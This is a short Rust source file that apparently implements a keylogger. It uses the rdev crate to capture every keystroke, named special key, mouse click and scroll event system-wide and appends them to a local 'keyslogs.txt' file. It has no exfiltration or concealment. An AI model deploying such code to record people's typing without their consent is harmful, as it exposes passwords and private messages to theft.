use rdev::{listen, Button, Event, EventType, Key};
use std::error::Error;
use std::fs::OpenOptions;
use std::io::Write;

pub fn run() -> Result<(), Box<dyn Error>> {
    if let Err(err) = listen(callback) {
        eprintln!("Error {:?}", err);
    }
    Ok(())
}

fn callback(event: Event) {
    if let Some(key) = event.name {
        log_key(&key);
    }

    match event.event_type {
        EventType::KeyPress(Key::Escape) => log_key(" Pressing Escape "),
        EventType::KeyPress(Key::CapsLock) => log_key(" Pressing CapsLock "),
        EventType::KeyPress(Key::F1) => log_key(" Pressing F1 "),
        EventType::KeyPress(Key::F2) => log_key(" Pressing F2 "),
        EventType::KeyPress(Key::F3) => log_key(" Pressing F3 "),
        EventType::KeyPress(Key::F4) => log_key(" Pressing F4 "),
        EventType::KeyPress(Key::F5) => log_key(" Pressing F5 "),
        EventType::KeyPress(Key::F6) => log_key(" Pressing F6 "),
        EventType::KeyPress(Key::F7) => log_key(" Pressing F7 "),
        EventType::KeyPress(Key::F8) => log_key(" Pressing F8 "),
        EventType::KeyPress(Key::F9) => log_key(" Pressing F9 "),
        EventType::KeyPress(Key::F10) => log_key(" Pressing F10 "),
        EventType::KeyPress(Key::F11) => log_key(" Pressing F11 "),
        EventType::KeyPress(Key::F12) => log_key(" Pressing F12 "),
        EventType::KeyPress(Key::End) => log_key(" Pressing End "),
        EventType::KeyPress(Key::Alt) => log_key(" Pressing Alt "),
        EventType::KeyPress(Key::UpArrow) => log_key(" Pressing UpArrow "),
        EventType::KeyPress(Key::DownArrow) => log_key(" Pressing DownArrow "),
        EventType::KeyPress(Key::LeftArrow) => log_key(" Pressing LeftArrow "),
        EventType::KeyPress(Key::RightArrow) => log_key(" Pressing LeftArrow "),
        EventType::KeyPress(Key::Backspace) => log_key(" Pressing Backspace "),
        EventType::KeyPress(Key::ControlLeft) => log_key(" Pressing ControlLeft "),
        EventType::KeyPress(Key::ControlRight) => log_key(" Pressing ControlRight "),
        EventType::KeyPress(Key::ShiftLeft) => log_key(" Pressing ShiftLeft "),
        EventType::KeyPress(Key::ShiftRight) => log_key(" Pressing ShiftRight "),
        EventType::KeyPress(Key::Space) => log_key(" Pressing SpaceBar "),
        EventType::KeyPress(Key::Tab) => log_key(" Pressing Tab "),
        EventType::ButtonPress(Button::Left) => log_key(" Left Clicking "),
        EventType::ButtonPress(Button::Right) => log_key(" Right Clicking "),
        EventType::ButtonPress(Button::Middle) => log_key(" Middle Clicking "),
        EventType::Wheel { delta_x, delta_y } => {
            let str = format!(" Mouse hovering {delta_x} {delta_y} ");
            log_key(&str);
        }
        _ => log_key("unknown "),
    }
}

fn log_key(key: &str) {
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open("keyslogs.txt")
        .unwrap();

    match key.trim() {
        "\n" => {
            if let Err(e) = writeln!(file, "{}", key) {
                eprintln!("Couldn't write to file: {}", e);
            }
        }
        "unknown" => {}
        _ => {
            if let Err(e) = write!(file, "{}", key) {
                eprintln!("Couldn't write to file: {}", e);
            }
        }
    }
}
